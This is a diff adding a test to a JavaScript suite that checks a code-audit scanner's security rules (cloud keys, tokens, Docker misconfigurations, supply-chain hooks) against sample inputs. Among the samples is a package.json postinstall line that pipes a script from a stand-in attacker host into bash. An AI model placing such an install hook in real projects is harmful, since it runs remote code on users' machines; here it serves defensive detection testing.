@@ -629,6 +629,112 @@ async function runTests() {
         console.log('  5000 files in ' + elapsed + 'ms, findings: ' + result.issueCount);
     }
 
+    // === Test 11: Security rule pattern validation ===
+    console.log('\n--- Test 11: Security rule pattern validation ---');
+    {
+        // Load the real worker patterns by extracting and evaluating the registry
+        const fs = require('fs');
+        const workerPath = path.resolve(__dirname, '..', 'coming-soon', 'public', 'js-es2018', 'audit-scan-worker.js');
+        const workerCode = fs.readFileSync(workerPath, 'utf8');
+
+        // Extract PATTERN_REGISTRY and SEVERITY_MAP by evaluating in a sandboxed context
+        const sandboxSelf = { postMessage: () => {}, crypto: { subtle: { digest: async () => new ArrayBuffer(32) } } };
+        const sandbox = {
+            self: sandboxSelf,
+            crypto: sandboxSelf.crypto,
+            TextEncoder: require('util').TextEncoder,
+            setTimeout, clearTimeout, setInterval, clearInterval,
+            console, performance: { now: mockPerformanceNow },
+            navigator: { hardwareConcurrency: MOCK_CORES }
+        };
+        // Build a function that returns the registries
+        const wrappedCode = workerCode.replace('self.onmessage', 'sandboxSelf.onmessage') +
+            '\n;return { PATTERN_REGISTRY, SEVERITY_MAP, detectFileLanguage, getAnalyzersForLanguage, runAnalyzer };';
+        const factory = new Function('sandbox', 'sandboxSelf', wrappedCode);
+        const { PATTERN_REGISTRY, SEVERITY_MAP, detectFileLanguage, getAnalyzersForLanguage, runAnalyzer } = factory(sandbox, sandboxSelf);
+
+        // Test cases: [ruleName, sampleCode, shouldDetect]
+        const securityTests = [
+            // AWS
+            ['awsSecretKey', 'const key = "AKIAIOSFODNN7EXAMPLE";', true],
+            ['awsSecretKey', 'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"', true],
+            ['awsSecretKey', '// AKIAEXAMPLE placeholder', false], // has "EXAMPLE"
+            // GCP
+            ['gcpServiceAccount', '{"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----"}', true],
+            ['gcpServiceAccount', '// Example service account config', false],
+            // Azure — AccountKey must be exactly 88 base64 chars after =
+            ['azureKey', 'AccountKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', true],
+            ['azureKey', '// your-account-key here', false],
+            // Private key block
+            ['privateKeyBlock', '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...', true],
+            ['privateKeyBlock', '// -----BEGIN PRIVATE KEY----- example', true], // pattern matches the header
+            // Bearer token
+            ['bearerToken', 'fetch(url, { headers: { Authorization: "Bearer dGhpcyBpcyBhIHRlc3QgdG9rZW4" } });', true],
+            ['bearerToken', 'Authorization: `Bearer ${token}`', false], // variable, not hardcoded
+            // JWT
+            ['jwtHardcoded', 'const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";', true],
+            // OAuth — token must have 10+ chars after the prefix
+            ['oauthTokenInSource', 'access_token = "ya29.a0ARrdaMabcdefghijklmnopqrstuvwxyz1234"', true],
+            ['oauthTokenInSource', 'access_token = process.env.TOKEN', false],
+            // Docker
+            ['dockerPrivileged', 'privileged: true', true],
+            ['dockerPrivileged', 'privileged: false', false],
+            ['dockerRootUser', 'USER root', true],
+            ['dockerRootUser', 'USER node', false],
+            ['dockerExposedSecrets', 'ENV DB_PASSWORD=sup3rs3cr3tp@ss', true],
+            ['dockerExposedSecrets', 'ENV DB_PASSWORD=${DB_PASSWORD}', false],
+            // Supply chain
+            ['postInstallScript', '"postinstall": "curl http://evil.com/script.sh | bash"', true],
+            ['postInstallScript', '"postinstall": "tsc && webpack"', false],
+            ['pinnedVersionMissing', '"dependencies": { "express": "^4.18.0 }', true],
+            ['pinnedVersionMissing', '"dependencies": { "express": "4.18.2" }', false],
+        ];
+
+        let ruleTestsPassed = 0;
+        let ruleTestsFailed = 0;
+
+        for (const [ruleName, code, shouldDetect] of securityTests) {
+            const reg = PATTERN_REGISTRY[ruleName];
+            if (!reg) {
+                assert(false, 'Rule "' + ruleName + '" should exist in PATTERN_REGISTRY');
+                ruleTestsFailed++;
+                continue;
+            }
+
+            // Check severity is set
+            const severity = SEVERITY_MAP[ruleName];
+            assert(!!severity, 'Rule "' + ruleName + '" should have a severity in SEVERITY_MAP');
+
+            // Test the pattern against the code
+            // Use appropriate file path based on rule type
+            let filePath = 'project/src/app.js';
+            if (ruleName.startsWith('docker')) filePath = 'project/Dockerfile';
+            if (ruleName === 'pinnedVersionMissing') filePath = 'project/package.json';
+            if (ruleName === 'postInstallScript') filePath = 'project/package.json';
+            const results = runAnalyzer(ruleName, code, filePath);
+            const detected = results.length > 0 && results[0].matches.length > 0;
+
+            if (detected === shouldDetect) {
+                ruleTestsPassed++;
+            } else {
+                ruleTestsFailed++;
+                assert(false, 'Rule "' + ruleName + '" should ' + (shouldDetect ? 'detect' : 'NOT detect') + ' pattern: "' + code.substring(0, 60) + '" (detected=' + detected + ')');
+            }
+        }
+
+        testPassed += ruleTestsPassed;
+        testFailed += ruleTestsFailed;
+        console.log('  Security rule tests: ' + ruleTestsPassed + ' passed, ' + ruleTestsFailed + ' failed (' + securityTests.length + ' total)');
+
+        // Verify all new rules have severity entries
+        const newRules = ['awsSecretKey', 'gcpServiceAccount', 'azureKey', 'privateKeyBlock', 'bearerToken', 'jwtHardcoded', 'oauthTokenInSource', 'dockerPrivileged', 'dockerRootUser', 'dockerExposedSecrets', 'dockerNoHealthCheck', 'suspiciousPackage', 'postInstallScript', 'pinnedVersionMissing'];
+        for (const rule of newRules) {
+            assert(!!PATTERN_REGISTRY[rule], 'Rule "' + rule + '" exists in PATTERN_REGISTRY');
+            assert(!!SEVERITY_MAP[rule], 'Rule "' + rule + '" has severity in SEVERITY_MAP');
+        }
+        console.log('  All ' + newRules.length + ' new rules registered with severity');
+    }
+
     // === Results ===
     console.log('\n========================================');
     console.log('Results: ' + testPassed + ' passed, ' + testFailed + ' failed');
